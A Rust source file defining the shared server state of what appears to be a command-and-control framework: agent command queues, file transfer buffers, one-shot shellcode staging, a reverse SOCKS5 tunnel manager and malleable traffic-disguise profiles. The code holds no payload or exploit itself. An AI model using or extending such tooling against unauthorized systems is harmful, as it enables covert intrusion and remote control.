//! Application state.

use std::collections::HashMap;
use std::sync::Arc;

use cloakcat_protocol::{DerivedKeys, ListenerProfile as _, MalleableProfile};
use sqlx::PgPool;
use tokio::sync::{Mutex, Notify};

use crate::listener_mgr::ListenerManager;
use crate::routes::API_VERSION;
use crate::tunnel::TunnelManager;

/// In-memory buffer for a chunked upload (CLI → server → agent).
pub struct UploadBuffer {
    /// Chunks indexed by seq number; None = not yet received.
    pub chunks: Vec<Option<Vec<u8>>>,
}

/// A shellcode payload staged for one-shot HTTP delivery.
pub struct StagedPayload {
    pub data: Vec<u8>,
    pub one_shot: bool,
    pub expires_at: std::time::Instant,
}

/// In-memory buffer for a chunked download (agent → server → CLI).
pub struct DownloadBuffer {
    /// Chunks indexed by seq number; None = not yet received.
    pub chunks: Vec<Option<Vec<u8>>>,
    pub complete: bool,
}

/// Shared application state (DB pool + command notification + transfer buffers).
#[derive(Clone)]
pub struct AppState {
    pub db: PgPool,
    /// HKDF-derived keys from SHARED_TOKEN (auth + signing).
    pub derived_keys: DerivedKeys,
    pub operator_token: String,
    /// Per-agent notification: poll_command waits, push_command notifies.
    pub cmd_notify: Arc<Mutex<HashMap<String, Arc<Notify>>>>,
    /// Pending upload transfers: transfer_id → buffer.
    pub upload_buffers: Arc<Mutex<HashMap<String, UploadBuffer>>>,
    /// Pending download transfers: transfer_id → buffer.
    pub download_buffers: Arc<Mutex<HashMap<String, DownloadBuffer>>>,
    /// Reverse SOCKS5 tunnel manager.
    pub tunnel_mgr: Arc<Mutex<TunnelManager>>,
    /// Primary malleable profile (backward compat — loaded via MALLEABLE_PROFILE_PATH).
    pub malleable_profile: Option<Arc<MalleableProfile>>,
    /// All loaded malleable profiles by name (superset of malleable_profile).
    pub profiles: Arc<HashMap<String, Arc<MalleableProfile>>>,
    /// Dynamic listener manager.
    pub listener_mgr: Arc<Mutex<ListenerManager>>,
    /// Staged payloads for one-shot HTTP delivery (`GET /d/<id>`).
    pub staging: Arc<Mutex<HashMap<String, StagedPayload>>>,
}

impl AppState {
    /// Get or create a Notify handle for an agent.
    pub async fn get_notify(&self, agent_id: &str) -> Arc<Notify> {
        let mut map = self.cmd_notify.lock().await;
        map.entry(agent_id.to_string())
            .or_insert_with(|| Arc::new(Notify::new()))
            .clone()
    }

    /// Look up the `MalleableProfile` for the given request URI.
    ///
    /// Strips the `/v1` API prefix, then finds the profile whose `base_path()`
    /// is the longest prefix match.  Falls back to `malleable_profile` for
    /// default/unmatched paths, then returns `None` if nothing is loaded.
    pub fn profile_for_uri(&self, uri: &str) -> Option<&Arc<MalleableProfile>> {
        let path = uri.strip_prefix(API_VERSION).unwrap_or(uri);

        let mut best: Option<&Arc<MalleableProfile>> = None;
        let mut best_len = 0usize;

        for profile in self.profiles.values() {
            let base = profile.base_path();
            if !base.is_empty() && path.starts_with(base) && base.len() > best_len {
                best = Some(profile);
                best_len = base.len();
            }
        }

        best.or(self.malleable_profile.as_ref())
    }
}
